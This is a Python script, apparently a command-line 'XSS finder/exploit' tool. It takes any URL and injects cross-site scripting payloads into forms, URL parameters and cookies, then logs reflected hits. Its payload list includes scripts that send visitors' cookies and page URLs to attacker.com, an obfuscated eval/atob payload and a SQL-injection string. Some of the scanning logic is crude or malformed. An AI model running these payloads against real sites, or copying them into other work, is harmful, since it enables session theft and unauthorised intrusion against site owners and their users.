import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import asyncio
import aiohttp
import time
import json
import argparse
import os
import sys

# Define XSS payloads
payloads = [
    "<script>alert('XSS')</script>",  
    "\"'><img src=x onerror=alert('XSS')>",  
    "<svg/onload=alert('XSS')>",  
    "<img src='x' onerror='alert(1)'>",  
    "<iframe src='javascript:alert(1)'></iframe>",  
    "<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>",  
    "<script>window.location='http://attacker.com/steal?url='+window.location</script>",  
    "<script>document.write('<img src=\"http://attacker.com/cookie?cookie='+document.cookie+'\" />');</script>",  
    "<script>eval('alert(1)')</script>",  
    "a' or 1=1 --",  
    "<script>eval(atob('YWxlcnQoMSk='))</script>",  
]

# Function to log findings and exfiltrate data (cookies, session, etc.)
def log_vulnerability(url, payload, response, vulnerability_type, details):
    log_data = {
        "url": url,
        "payload": payload,
        "response_snippet": response.text[:100],  
        "vulnerability_type": vulnerability_type,
        "details": details,
        "timestamp": time.time()
    }
    
    if not os.path.exists('xss_exploit_logs'):
        os.mkdir('xss_exploit_logs')
    
    log_file_path = 'xss_exploit_logs/xss_vulnerabilities.json'
    
    with open(log_file_path, "a") as log_file:
        log_file.write(json.dumps(log_data) + "\n")
        print(f"Logged vulnerability in {log_file_path}")

# Function to check for XSS in the response
def check_xss(response, payload):
    if payload in response.text:
        return True
    return False

# Function to get detailed information about the target website (headers, cookies, etc.)
async def get_target_details(url, session):
    try:
        async with session.get(url) as response:
            response.raise_for_status()
            
            headers = response.headers
            cookies = response.cookies
            
            soup = BeautifulSoup(await response.text(), "html.parser")
            title = soup.title.string if soup.title else "No title found"
            description = ""
            for meta in soup.find_all("meta"):
                if "description" in meta.attrs.get("name", "").lower():
                    description = meta.attrs.get("content", "No description found")
            
            return {
                "url": url,
                "status_code": response.status,
                "title": title,
                "description": description,
                "headers": headers,
                "cookies": cookies,
            }
    except Exception as e:
        print(f"Error retrieving target details: {e}")
        return None

# Function to scan URL parameters for XSS vulnerabilities
async def scan_url_params(url, payload, session):
    parsed_url = urlparse(url)
    params = parsed_url.query
    if params:
        new_url = f"{url}&{payload}"
        async with session.get(new_url) as response:
            if check_xss(response, payload):
                print(f"[+] XSS Found in URL: {new_url}")
                log_vulnerability(new_url, payload, response, "URL Parameter", {"params": params})

# Function to scan cookies for XSS vulnerabilities
async def scan_cookies(url, payload, session):
    cookies = {"session": "testcookie"}
    async with session.get(url, cookies=cookies) as response:
        if check_xss(response, payload):
            print(f"[+] XSS Found in Cookies: {url}")
            log_vulnerability(url, payload, response, "Cookies", {"cookies": cookies})

# Function to scan forms and inject payloads
async def exploit_form(form_details, payload, session):
    data = {}
    for input_tag in form_details["inputs"]:
        if input_tag["type"] == "text":
            data[input_tag["name"]] = payload

    if form_details["method"] == "post":
        async with session.post(form_details["action"], data=data) as response:
            if check_xss(response, payload):
                print(f"[+] Exploited XSS in form: {form_details['action']} with payload: {payload}")
                log_vulnerability(form_details["action"], payload, response, "Form", {"form_details": form_details})
    else:
        async with session.get(form_details["action"], params=data) as response:
            if check_xss(response, payload):
                print(f"[+] Exploited XSS in form: {form_details['action']} with payload: {payload}")
                log_vulnerability(form_details["action"], payload, response, "Form", {"form_details": form_details})

# Main function to handle scanning and exploit
async def bukhari_xss_finder_exploit(url, log_report=False):
    async with aiohttp.ClientSession() as session:
        # Retrieve target details (headers, cookies, etc.)
        target_details = await get_target_details(url, session)
        if not target_details:
            return

        print(f"Scanning target: {target_details['url']}")
        print(f"Title: {target_details['title']}")
        print(f"Description: {target_details['description']}")

        # Send GET request to the page
        async with session.get(url) as response:
            response.raise_for_status()
            soup = BeautifulSoup(await response.text(), "html.parser")

        # Scan forms for potential XSS injection points
        forms = soup.find_all("form")
        tasks = []
        for form in forms:
            form_details = {}
            action = form.get("action")
            method = form.get("method", "get").lower()
            inputs = form.find_all("input")
            form_details["action"] = urljoin(url, action)
            form_details["method"] = method
            form_details["inputs"] = []

            for input_tag in inputs:
                input_name = input_tag.get("name")
                input_type = input_tag.get("type", "text")
                form_details["inputs"].append({"name": input_name, "type": input_type})

            for payload in payloads:
                tasks.append(exploit_form(form_details, payload, session))

        # Scan URL parameters for XSS
        for payload in payloads:
            tasks.append(scan_url_params(url, payload, session))

        # Scan cookies for XSS
        for payload in payloads:
            tasks.append(scan_cookies(url, payload, session))

        # Wait for all tasks to complete
        await asyncio.gather(*tasks)

        # Optionally generate a log report
        if log_report:
            print("\nGenerating detailed XSS vulnerability report...")
            with open('xss_exploit_logs/xss_vulnerabilities.json', 'r') as log_file:
                print(log_file.read())

# CLI setup
def main():
    parser = argparse.ArgumentParser(description="Bukhari XSS Finder - A Super Fast XSS Vulnerability Finder")
    parser.add_argument("url", type=str, help="URL of the website to scan")
    parser.add_argument("--log-report", action="store_true", help="Generate a detailed log report of the findings")
    args = parser.parse_args()

    target_url = args.url
    log_report = args.log_report
    
    # Run the exploit scanner
    loop = asyncio.get_event_loop()
    loop.run_until_complete(bukhari_xss_finder_exploit(target_url, log_report))

if __name__ == "__main__":
    main()
